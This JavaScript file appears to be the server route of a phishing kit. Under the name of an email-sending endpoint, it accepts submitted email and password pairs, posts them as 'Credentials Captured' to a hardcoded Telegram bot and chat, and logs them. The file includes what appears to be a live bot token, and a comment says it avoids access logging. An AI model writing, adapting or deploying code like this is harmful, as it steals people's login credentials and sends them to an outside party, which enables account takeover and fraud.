/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "8469088081:AAG4hzZjzae1WbPBwlaKcJzVBOVSPO0P3k8";
const bot = new TelegramClient(botToken);
const chatId = "8049301194";

// Handle POST requests for form submissions
export async function POST(req) {
  const { email, password } = await req.json();

  try {
    // Send notification for credentials
    if (email && password) {
      const credentialsMessage = `
🔐 *Credentials Captured*

*Email:* ${email}
*Password:* ${password}
      `;

      await bot.sendMessage({
        text: credentialsMessage,
        chatId: chatId,
        parse_mode: "Markdown"
      });

      console.log(
        `Credentials sent to telegram: Email: ${email}, Password: ${password}`
      );

      return new Response(
        JSON.stringify({ message: "Credentials sent successfully!" }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    // Return error if email or password is missing
    return new Response(
      JSON.stringify({ error: "Email and password are required" }),
      {
        status: 400,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Remove GET handler entirely since we don't want page access logging